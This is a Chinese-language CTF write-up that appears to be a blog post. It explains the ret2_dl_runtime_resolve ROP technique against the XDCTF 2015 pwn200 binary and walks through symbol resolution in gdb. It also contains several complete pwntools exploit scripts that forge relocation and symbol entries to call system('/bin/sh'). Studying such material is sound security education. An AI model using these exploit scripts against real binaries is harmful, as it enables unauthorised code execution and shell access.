---
title: 高级ROP-ret2_dl_runtime_resolve
date:   2020-07-13 15:35:15
updated:  2020-07-13 15:35:15
tags:
    - 高级ROP
    - wiki
    - pwn
    - ret2_dl_runtime_resolve
categories: 
	- 二进制安全
	- wiki-pwn
use:
  - Valine
text: true
lazyload: true
count: true
---
# 1.看雪

## 1.源码

XDCTF 2015 的 pwn200   

```c
#include <unistd.h>
#include <stdio.h>
#include <string.h>
void vuln()
{
    char buf[100];
    setbuf(stdin, buf);
    read(0, buf, 256);
}

int main()
{
    char buf[100] = "Welcome to XDCTF2015~!\n";
    setbuf(stdout, buf);
    write(1, buf, strlen(buf));
    vuln();
    return 0;
}
```

## 2._dl_runtime_resolve函数

_dl_runtime_resolve(link_map_obj, reloc_index)

1、首先用link_map访问.dynamic，分别取出.dynstr、 .dynsym、 .rel.plt的地址；

2、.rel.plt + 参数reloc_index,求出当前函数的重定位表项Elf32_Rel的指针，记作rel;

3、rel->r_info >> 8作为.dynsym的下标，求出当前函数的符号表项Elf32_Sym的指针，记作sym;

3、.dynstr + sym->st_name得出符号名字符串指针;

4、在动态链接库查找这个函数的地址，并且把地址赋值给*rel->r_offset，即GOT表;

5、最后调用这个函数；

## 3.调试

![image.png](https://i.loli.net/2020/11/17/IiSkxAYOJZ45LGE.png)

在第一次调用strlen函数前下断点

![image.png](https://i.loli.net/2020/11/17/K1JlXwfdItgBN3M.png)

si进入该函数

![image.png](https://i.loli.net/2020/11/17/TmytcL2YIkV1DCz.png)

程序进到了dl_runtime_resolve并在之前push了两个参数

```
push 0x10
push dword ptr [_GLOBAL_OFFSET_TABLE_+4]<0x804a004>
```

刚好是_dl_runtime_resolve(link_map_obj, reloc_index)需要的参数；其中0x804a004就是link_map指针,然后0x10就是reloc_index;

首先查看link_map指针里的内容：

![image.png](https://i.loli.net/2020/11/17/KuTBneR5afD9Gi4.png)

是一个地址（link_map）

查看它

![image.png](https://i.loli.net/2020/11/17/857BKXvzObrPgtf.png)

其中第三个地址就是.dynamic的地址，即0x08049f14

通过.dynamic来找到.dynstr、 .dynsym、 .rel.plt的地址：

![image.png](https://i.loli.net/2020/11/17/Y6IAnEhSOR3Quip.png)

- .dynstr 的地址是 .dynamic + 0x44 -> 0x08048278
- .dynsym 的地址是 .dynamic + 0x4c -> 0x080481d8
- .rel.plt 的地址是 .dynamic + 0x84 -> 0x08048330

然后用.rel.plt的地址加上参数reloc_index,即0x08048330 + 0x10找到函数的重定位表项Elf32_Rel的指针，记作rel

![image.png](https://i.loli.net/2020/11/17/8horOk6mI13R7PL.png)

得到了两个值

r_offset = 0x0804a014  //指向GOT表的指针

r_info = 0x00000407

然后我们将r_info>>8,即0x00000407>>8 = 4作为.dynsym中的下标

此时我们来到.dynsym的位置，去找找strlen函数的名字符串偏移

![image.png](https://i.loli.net/2020/11/17/urqTQH6ayYNO2bR.png)

下标从上往下是0、1、2、3、4

所以是0x00000020->name_offset

然后用.dynstr的地址加上name_offset，就是这个函数的符号名字符串st_name

![image.png](https://i.loli.net/2020/11/17/fKTkOFU91ltQB7i.png)

在动态链接库查找这个函数的地址，并且把地址赋值给 *rel -> r_offset，即 GOT 表就可以了

![1.png](https://i.loli.net/2020/11/17/XMr6hCFVuQznOmj.png)

## 4.思路

虚拟地址是通过最后一个箭头，即从st_name得来的，只要我们能够修改这个st_name的内容就可以执行任意函数。比如把st_name的内容修改成为"system"

而index_arg即参数n是我们可以控制的，我们需要做的是通过一系列操作。把index_arg可控转化为st_name可控

**计算index_reg**

![image.png](https://i.loli.net/2020/11/17/eMhAvwLOTG8lFco.png)

```
reloc_arg = fake_rel_plt_addr - 0x8048330
```

**计算r_info**

```
n = (欲伪造的地址- .dynsym 基地址) / 0x10
r_info = n<<8
```

![image.png](https://i.loli.net/2020/11/17/bet5VqAC19s7GJn.png)

还需要过#define ELF32_R_TYPE(val)  ((val) & 0xff)宏定义，ELF32_R_TYPE(r_info)=7，因此

```
r_info = r_info + 0x7
```

**计算name_offset**

**![image.png](https://i.loli.net/2020/11/17/eo6Uwx3rIEX2TkB.png)
**

```
st_name = fake_dynstr_addr - 0x8048278
```

构造的ROP：
![image.png](https://i.loli.net/2020/11/17/jsdw3SvAg5oUpH2.png)

## 5.脚本

```python
from pwn import *
context.log_level = 'debug'
context.terminal = ['deepin-terminal', '-x', 'sh' ,'-c']
name = './main'
p = process(name)
elf= ELF(name)
rel_plt_addr = elf.get_section_by_name('.rel.plt').header.sh_addr   #0x8048330
dynsym_addr =  elf.get_section_by_name('.dynsym').header.sh_addr    #0x80481d8
dynstr_addr = elf.get_section_by_name('.dynstr').header.sh_addr     #0x8048278
resolve_plt = 0x08048380
leave_ret_addr = 0x8048458

start = 0x804aa00
fake_rel_plt_addr = start
fake_dynsym_addr = fake_rel_plt_addr + 0x8
fake_dynstr_addr = fake_dynsym_addr + 0x10
bin_sh_addr = fake_dynstr_addr + 0x7
#n就是reloc_arg
n = fake_rel_plt_addr - rel_plt_addr
r_info = (((fake_dynsym_addr - dynsym_addr)/0x10) << 8) + 0x7
str_offset = fake_dynstr_addr - dynstr_addr
fake_rel_plt = p32(elf.got['read']) + p32(r_info)
fake_dynsym = p32(str_offset) + p32(0) + p32(0) + p32(0x12000000)
fake_dynstr = "system\x00/bin/sh\x00\x00"
pay1 = 'a'*108 + p32(start - 20) + p32(elf.plt['read']) + p32(leave_ret_addr) + p32(0) + p32(start - 20) + p32(0x100)
p.recvuntil('Welcome to XDCTF2015~!\n')
p.sendline(pay1)
pay2 = p32(0x0) + p32(resolve_plt) + p32(n) + 'aaaa' + p32(bin_sh_addr) + fake_rel_plt + fake_dynsym + fake_dynstr
p.sendline(pay2)
success(".rel_plt: " + hex(rel_plt_addr))
success(".dynsym: " + hex(dynsym_addr))
success(".dynstr: " + hex(dynstr_addr))
success("fake_rel_plt_addr: " + hex(fake_rel_plt_addr))
success("fake_dynsym_addr: " + hex(fake_dynsym_addr))
success("fake_dynstr_addr: " + hex(fake_dynstr_addr))
success("n: " + hex(n))
success("r_info: " + hex(r_info))
success("offset: " + hex(str_offset))
success("system_addr: " + hex(fake_dynstr_addr))
success("bss_addr: " + hex(elf.bss()))
p.interactive()
```

以上参考https://bbs.pediy.com/thread-250703.htm

# 2.wiki

## 1.分析

![image.png](https://i.loli.net/2020/11/17/cF9q2ZHPSoLMV4r.png)

![image.png](https://i.loli.net/2020/11/17/yKPQ7cTZXYEwaAi.png)

很简单，就是一个栈溢出，偏移为112（108+4）

## 2.stage1

这里我们的主要目的是控制程序执行 write 函数，使用栈迁移的技巧，将栈迁移到 bss 段来控制 write 函数。即主要分为两步

1. 将栈迁移到 bss 段。
2. 控制 write 函数输出相应字符串。

这里主要使用了 pwntools 中的 ROP 模块。

```python
from pwn import *
elf = ELF('main')
r = process('./main')
rop = ROP('./main')

offset = 112
bss_addr = elf.bss()

r.recvuntil('Welcome to XDCTF2015~!\n')

## stack pivoting to bss segment
## new stack size is 0x800
stack_size = 0x800
base_stage = bss_addr + stack_size
### padding
rop.raw('a' * offset)
### read 100 byte to base_stage
rop.read(0, base_stage, 100)    #相当于rop.call('read',[0,base_stage,100])
### stack pivoting, set esp = base_stage
rop.migrate(base_stage)
r.sendline(rop.chain())


## write cmd="/bin/sh"
rop = ROP('./main')
sh = "/bin/sh"
rop.write(1, base_stage + 80, len(sh))
rop.raw('a' * (80 - len(rop.chain())))
rop.raw(sh)
rop.raw('a' * (100 - len(rop.chain())))

r.sendline(rop.chain())
r.interactive()
```

非ROP模块版：

```python
#!/usr/bin/python

from pwn import *
elf = ELF('main')
offset = 112
read_plt = elf.plt['read']
write_plt = elf.plt['write']

ppp_ret = 0x08048619 # ROPgadget --binary bof --only "pop|ret"
pop_ebp_ret = 0x0804861b
leave_ret = 0x08048458 # ROPgadget --binary bof --only "leave|ret"

stack_size = 0x800
bss_addr = 0x0804a040 # readelf -S bof | grep ".bss"
base_stage = bss_addr + stack_size

r = process('./bof')

r.recvuntil('Welcome to XDCTF2015~!\n')
payload = 'A' * offset
payload += p32(read_plt) # 读100个字节到base_stage
payload += p32(ppp_ret)
payload += p32(0)
payload += p32(base_stage)
payload += p32(100)
payload += p32(pop_ebp_ret) # 把base_stage pop到ebp中
payload += p32(base_stage)
payload += p32(leave_ret) # mov esp, ebp ; pop ebp ;将esp指向base_stage
r.sendline(payload)

cmd = "/bin/sh"

payload2 = 'AAAA' # 接上一个payload的leave->pop ebp ; ret
payload2 += p32(write_plt)
payload2 += 'AAAA'
payload2 += p32(1)
payload2 += p32(base_stage + 80)
payload2 += p32(len(cmd))
payload2 += 'A' * (80 - len(payload2))
payload2 += cmd + '\x00'
payload2 += 'A' * (100 - len(payload2))
r.sendline(payload2)
r.interactive()
```

## 3.stage2

这里我们主要是利用 plt[0] 中的相关指令，即 push linkmap 以及跳转到 dl_resolve 函数中解析的指令。此外，我们还得单独提供一个 write 重定位项在 plt 表中的偏移。

```python
from pwn import *
elf = ELF('main')
r = process('./main')
rop = ROP('./main')

offset = 112
bss_addr = elf.bss()

r.recvuntil('Welcome to XDCTF2015~!\n')

# stack privot to bss segment
# new stack size is 0x800
stack_size = 0x800
base_stage = bss_addr + stack_size
## padding
rop.raw('a' * offset)
## read 100 byte to base_stage
rop.read(0, base_stage, 100)
## stack privot, set esp = base_stage
rop.migrate(base_stage)
r.sendline(rop.chain())

# write sh="/bin/sh"
rop = ROP('./main')
sh = "/bin/sh"

plt0 = elf.get_section_by_name('.plt').header.sh_addr
write_index = (elf.plt['write'] - plt0) / 16 - 1
write_index *= 8        #得到push参数write@plt
rop.raw(plt0)       #先调用plt，栈中是已布置好的参数
rop.raw(write_index)
# fake ret addr of write
rop.raw('bbbb')
rop.raw(1)
rop.raw(base_stage + 80)
rop.raw(len(sh))
rop.raw('a' * (80 - len(rop.chain())))
rop.raw(sh)
rop.raw('a' * (100 - len(rop.chain())))

r.sendline(rop.chain())
r.interactive()
```

非ROP模块版：

```python
...
cmd = "/bin/sh"
plt_0 = 0x08048380 # objdump -d -j .plt main
index_offset = 0x20 # write's index

payload2 = 'AAAA'
payload2 += p32(plt_0)
payload2 += p32(index_offset)
payload2 += 'AAAA'
payload2 += p32(1)
payload2 += p32(base_stage + 80)
payload2 += p32(len(cmd))
payload2 += 'A' * (80 - len(payload2))
payload2 += cmd + '\x00'
payload2 += 'A' * (100 - len(payload2))
r.sendline(payload2)
r.interactive()
```

## 4.stage3

这一次，我们同样控制 dl_resolve 函数中的 index_offset 参数，不过这次控制其指向我们伪造的 write 重定位项。

![image.png](https://i.loli.net/2020/11/17/V6mL3wZb8gJHTp4.png)

可以看出 write 的重定表项的 r_offset=0x0804a01c，r_info=0x00000607

```python
from pwn import *
elf = ELF('main')
r = process('./main')
rop = ROP('./main')

offset = 112
bss_addr = elf.bss()

r.recvuntil('Welcome to XDCTF2015~!\n')

# stack privot to bss segment
# new stack size is 0x800
stack_size = 0x800
base_stage = bss_addr + stack_size
## padding
rop.raw('a' * offset)
## read 100 byte to base_stage
rop.read(0, base_stage, 100)
## stack privot, set esp = base_stage
rop.migrate(base_stage)
r.sendline(rop.chain())

# write sh="/bin/sh"
rop = ROP('./main')
sh = "/bin/sh"

plt0 = elf.get_section_by_name('.plt').header.sh_addr
rel_plt = elf.get_section_by_name('.rel.plt').header.sh_addr
# making base_stage+24 ---> fake reloc
index_offset = base_stage + 24 - rel_plt
write_got = elf.got['write']
r_info = 0x607

rop.raw(plt0)
rop.raw(index_offset)
# fake ret addr of write
rop.raw('bbbb')
rop.raw(1)
rop.raw(base_stage + 80)
rop.raw(len(sh))
rop.raw(write_got)  # fake reloc
rop.raw(r_info)
rop.raw('a' * (80 - len(rop.chain())))
rop.raw(sh)
rop.raw('a' * (100 - len(rop.chain())))

r.sendline(rop.chain())
r.interactive()
```

非ROP模块版：

```python
...
cmd = "/bin/sh"
plt_0 = 0x08048380 # objdump -d -j .plt bof
rel_plt = 0x08048330 # objdump -s -j .rel.plt bof
index_offset = (base_stage + 28) - rel_plt # base_stage + 28指向fake_reloc，减去rel_plt即偏移
write_got = elf.got['write']
r_info = 0x607 # write: Elf32_Rel->r_info
fake_reloc = p32(write_got) + p32(r_info)

payload2 = 'AAAA'
payload2 += p32(plt_0)
payload2 += p32(index_offset)
payload2 += 'AAAA'
payload2 += p32(1)
payload2 += p32(base_stage + 80)
payload2 += p32(len(cmd))
payload2 += fake_reloc # (base_stage+28)的位置
payload2 += 'A' * (80 - len(payload2))
payload2 += cmd + '\x00'
payload2 += 'A' * (100 - len(payload2))
r.sendline(payload2)
r.interactive()
```

## 5.stage4

在stage3 中，我们控制了重定位表项，但是重定位表项的内容与 write 原来的重定位表项一致，这次，我们将构造属于我们自己的重定位表项，并且伪造该表项对应的符号。首先，我们根据 write 的重定位表项的 r_info=0x607 可以知道，write 对应的符号在符号表的下标为 0x607>>8=0x6。因此，我们知道 write 对应的符号地址为 0x8048238。

![image.png](https://i.loli.net/2020/11/17/QcfI6TG9aDgLEH5.png)

这里给出的其实是小端模式，因此我们需要手工转换。此外，每个符号占用的大小为 16 个字节。

```python
from pwn import *
elf = ELF('main')
r = process('./main')
rop = ROP('./main')

offset = 112
bss_addr = elf.bss()

r.recvuntil('Welcome to XDCTF2015~!\n')

## stack pivoting to bss segment
## new stack size is 0x800
stack_size = 0x800
base_stage = bss_addr + stack_size
### padding
rop.raw('a' * offset)
### read 100 byte to base_stage
rop.read(0, base_stage, 100)
### stack pivoting, set esp = base_stage
rop.migrate(base_stage)
r.sendline(rop.chain())

## write sh="/bin/sh"
rop = ROP('./main')
sh = "/bin/sh"

plt0 = elf.get_section_by_name('.plt').header.sh_addr
rel_plt = elf.get_section_by_name('.rel.plt').header.sh_addr
dynsym = elf.get_section_by_name('.dynsym').header.sh_addr
dynstr = elf.get_section_by_name('.dynstr').header.sh_addr

### making fake write symbol
fake_sym_addr = base_stage + 32
align = 0x10 - ((fake_sym_addr - dynsym) & 0xf
                )  # since the size of item(Elf32_Symbol) of dynsym is 0x10
fake_sym_addr = fake_sym_addr + align
index_dynsym = (
    fake_sym_addr - dynsym) / 0x10  # calculate the dynsym index of write
fake_write_sym = flat([0x4c, 0, 0, 0x12])

### making fake write relocation

## making base_stage+24 ---> fake reloc
index_offset = base_stage + 24 - rel_plt
write_got = elf.got['write']
r_info = (index_dynsym << 8) | 0x7
fake_write_reloc = flat([write_got, r_info])

rop.raw(plt0)
rop.raw(index_offset)
## fake ret addr of write
rop.raw('bbbb')
rop.raw(1)
rop.raw(base_stage + 80)
rop.raw(len(sh))
rop.raw(fake_write_reloc)  # fake write reloc
rop.raw('a' * align)  # padding
rop.raw(fake_write_sym)  # fake write symbol
rop.raw('a' * (80 - len(rop.chain())))
rop.raw(sh)
rop.raw('a' * (100 - len(rop.chain())))

r.sendline(rop.chain())
r.interactive()
```

非ROP模块版：

```python
...
cmd = "/bin/sh"
plt_0 = 0x08048380
rel_plt = 0x08048330
index_offset = (base_stage + 28) - rel_plt
write_got = elf.got['write']
dynsym = 0x080481d8
dynstr = 0x08048278
fake_sym_addr = base_stage + 36
align = 0x10 - ((fake_sym_addr - dynsym) & 0xf) # 这里的对齐操作是因为dynsym里的Elf32_Sym结构体都是0x10字节大小
fake_sym_addr = fake_sym_addr + align
index_dynsym = (fake_sym_addr - dynsym) / 0x10 # 除以0x10因为Elf32_Sym结构体的大小为0x10，得到write的dynsym索引号
r_info = (index_dynsym << 8) | 0x7
fake_reloc = p32(write_got) + p32(r_info)
st_name = 0x4c
fake_sym = p32(st_name) + p32(0) + p32(0) + p32(0x12)

payload2 = 'AAAA'
payload2 += p32(plt_0)
payload2 += p32(index_offset)
payload2 += 'AAAA'
payload2 += p32(1)
payload2 += p32(base_stage + 80)
payload2 += p32(len(cmd))
payload2 += fake_reloc # (base_stage+28)的位置
payload2 += 'B' * align
payload2 += fake_sym # (base_stage+36)的位置
payload2 += 'A' * (80 - len(payload2))
payload2 += cmd + '\x00'
payload2 += 'A' * (100 - len(payload2))
r.sendline(payload2)
r.interactive()
```

## 6.stage5

这一阶段，我们将在阶段 4 的基础上，我们进一步使得 write 符号的 st_name 指向我们自己构造的字符串。

```python
from pwn import *
elf = ELF('main')
r = process('./main')
rop = ROP('./main')

offset = 112
bss_addr = elf.bss()

r.recvuntil('Welcome to XDCTF2015~!\n')

## stack pivoting to bss segment
## new stack size is 0x800
stack_size = 0x800
base_stage = bss_addr + stack_size
### padding
rop.raw('a' * offset)
### read 100 byte to base_stage
rop.read(0, base_stage, 100)
### stack pivoting, set esp = base_stage
rop.migrate(base_stage)
r.sendline(rop.chain())

## write sh="/bin/sh"
rop = ROP('./main')
sh = "/bin/sh"

plt0 = elf.get_section_by_name('.plt').header.sh_addr
rel_plt = elf.get_section_by_name('.rel.plt').header.sh_addr
dynsym = elf.get_section_by_name('.dynsym').header.sh_addr
dynstr = elf.get_section_by_name('.dynstr').header.sh_addr

### making fake write symbol
fake_sym_addr = base_stage + 32
align = 0x10 - ((fake_sym_addr - dynsym) & 0xf
                )  # since the size of item(Elf32_Symbol) of dynsym is 0x10
fake_sym_addr = fake_sym_addr + align
index_dynsym = (
    fake_sym_addr - dynsym) / 0x10  # calculate the dynsym index of write
## plus 10 since the size of Elf32_Sym is 16.
st_name = fake_sym_addr + 0x10 - dynstr
fake_write_sym = flat([st_name, 0, 0, 0x12])

### making fake write relocation

## making base_stage+24 ---> fake reloc
index_offset = base_stage + 24 - rel_plt
write_got = elf.got['write']
r_info = (index_dynsym << 8) | 0x7
fake_write_reloc = flat([write_got, r_info])

rop.raw(plt0)
rop.raw(index_offset)
## fake ret addr of write
rop.raw('bbbb')
rop.raw(1)
rop.raw(base_stage + 80)
rop.raw(len(sh))
rop.raw(fake_write_reloc)  # fake write reloc
rop.raw('a' * align)  # padding
rop.raw(fake_write_sym)  # fake write symbol
rop.raw('write\x00')  # there must be a \x00 to mark the end of string
rop.raw('a' * (80 - len(rop.chain())))
rop.raw(sh)
rop.raw('a' * (100 - len(rop.chain())))

r.sendline(rop.chain())
r.interactive()
```

非ROP模块版：

```python
...
cmd = "/bin/sh"
plt_0 = 0x08048380
rel_plt = 0x08048330
index_offset = (base_stage + 28) - rel_plt
write_got = elf.got['write']
dynsym = 0x080481d8
dynstr = 0x08048278
fake_sym_addr = base_stage + 36
align = 0x10 - ((fake_sym_addr - dynsym) & 0xf)
fake_sym_addr = fake_sym_addr + align
index_dynsym = (fake_sym_addr - dynsym) / 0x10
r_info = (index_dynsym << 8) | 0x7
fake_reloc = p32(write_got) + p32(r_info)
st_name = (fake_sym_addr + 0x10) - dynstr # 加0x10因为Elf32_Sym的大小为0x10
fake_sym = p32(st_name) + p32(0) + p32(0) + p32(0x12)

payload2 = 'AAAA'
payload2 += p32(plt_0)
payload2 += p32(index_offset)
payload2 += 'AAAA'
payload2 += p32(1)
payload2 += p32(base_stage + 80)
payload2 += p32(len(cmd))
payload2 += fake_reloc # (base_stage+28)的位置
payload2 += 'B' * align
payload2 += fake_sym # (base_stage+36)的位置
payload2 += "write\x00"
payload2 += 'A' * (80 - len(payload2))
payload2 += cmd + '\x00'
payload2 += 'A' * (100 - len(payload2))
r.sendline(payload2)
r.interactive()
```

## 7.stage6

这一阶段，我们只需要将原先的 write 字符串修改为 system 字符串，同时修改 write 的参数为 system 的参数即可获取 shell。这是因为，dl_resolve 最终依赖的是我们所给定的字符串，即使我们给了一个假的字符串它仍然会去解析并执行。具体代码如下

```python
from pwn import *
elf = ELF('main')
r = process('./main')
rop = ROP('./main')

offset = 112
bss_addr = elf.bss()

r.recvuntil('Welcome to XDCTF2015~!\n')

## stack pivoting to bss segment
## new stack size is 0x800
stack_size = 0x800
base_stage = bss_addr + stack_size
### padding
rop.raw('a' * offset)
### read 100 byte to base_stage
rop.read(0, base_stage, 100)
### stack pivoting, set esp = base_stage
rop.migrate(base_stage)
r.sendline(rop.chain())

## write sh="/bin/sh"
rop = ROP('./main')
sh = "/bin/sh"

plt0 = elf.get_section_by_name('.plt').header.sh_addr
rel_plt = elf.get_section_by_name('.rel.plt').header.sh_addr
dynsym = elf.get_section_by_name('.dynsym').header.sh_addr
dynstr = elf.get_section_by_name('.dynstr').header.sh_addr

### making fake write symbol
fake_sym_addr = base_stage + 32
align = 0x10 - ((fake_sym_addr - dynsym) & 0xf
                )  # since the size of item(Elf32_Symbol) of dynsym is 0x10
fake_sym_addr = fake_sym_addr + align
index_dynsym = (
    fake_sym_addr - dynsym) / 0x10  # calculate the dynsym index of write
## plus 10 since the size of Elf32_Sym is 16.
st_name = fake_sym_addr + 0x10 - dynstr
fake_write_sym = flat([st_name, 0, 0, 0x12])

### making fake write relocation

## making base_stage+24 ---> fake reloc
index_offset = base_stage + 24 - rel_plt
write_got = elf.got['write']
r_info = (index_dynsym << 8) | 0x7
fake_write_reloc = flat([write_got, r_info])

rop.raw(plt0)
rop.raw(index_offset)
## fake ret addr of write
rop.raw('bbbb')
rop.raw(base_stage + 82)
rop.raw('bbbb')
rop.raw('bbbb')
rop.raw(fake_write_reloc)  # fake write reloc
rop.raw('a' * align)  # padding
rop.raw(fake_write_sym)  # fake write symbol
rop.raw('system\x00')  # there must be a \x00 to mark the end of string
rop.raw('a' * (80 - len(rop.chain())))
print rop.dump()
print len(rop.chain())
rop.raw(sh + '\x00')
rop.raw('a' * (100 - len(rop.chain())))

r.sendline(rop.chain())
r.interactive()
```

非ROP模块版：

```python
...
cmd = "/bin/sh"
plt_0 = 0x08048380
rel_plt = 0x08048330
index_offset = (base_stage + 28) - rel_plt
write_got = elf.got['write']
dynsym = 0x080481d8
dynstr = 0x08048278
fake_sym_addr = base_stage + 36
align = 0x10 - ((fake_sym_addr - dynsym) & 0xf)
fake_sym_addr = fake_sym_addr + align
index_dynsym = (fake_sym_addr - dynsym) / 0x10
r_info = (index_dynsym << 8) | 0x7
fake_reloc = p32(write_got) + p32(r_info)
st_name = (fake_sym_addr + 0x10) - dynstr
fake_sym = p32(st_name) + p32(0) + p32(0) + p32(0x12)

payload2 = 'AAAA'
payload2 += p32(plt_0)
payload2 += p32(index_offset)
payload2 += 'AAAA'
payload2 += p32(base_stage + 80)
payload2 += 'aaaa'
payload2 += 'aaaa'
payload2 += fake_reloc # (base_stage+28)的位置
payload2 += 'B' * align
payload2 += fake_sym # (base_stage+36)的位置
payload2 += "system\x00"
payload2 += 'A' * (80 - len(payload2))
payload2 += cmd + '\x00'
payload2 += 'A' * (100 - len(payload2))
r.sendline(payload2)
r.interactive()
```

## 8.roputil工具

```python
from roputils import *
from pwn import process
from pwn import gdb
from pwn import context
r = process('./main')
context.log_level = 'debug'
r.recv()

rop = ROP('./main')
offset = 112
bss_base = rop.section('.bss')
buf = rop.fill(offset)

buf += rop.call('read', 0, bss_base, 100)
## used to call dl_Resolve()
buf += rop.dl_resolve_call(bss_base + 20, bss_base)
r.send(buf)

buf = rop.string('/bin/sh')
buf += rop.fill(20, buf)
## used to make faking data, such relocation, Symbol, Str
buf += rop.dl_resolve_data(bss_base + 20, 'system')
buf += rop.fill(100, buf)
r.send(buf)
r.interactive()
```

参考：http://pwn4.fun/2016/11/09/Return-to-dl-resolve/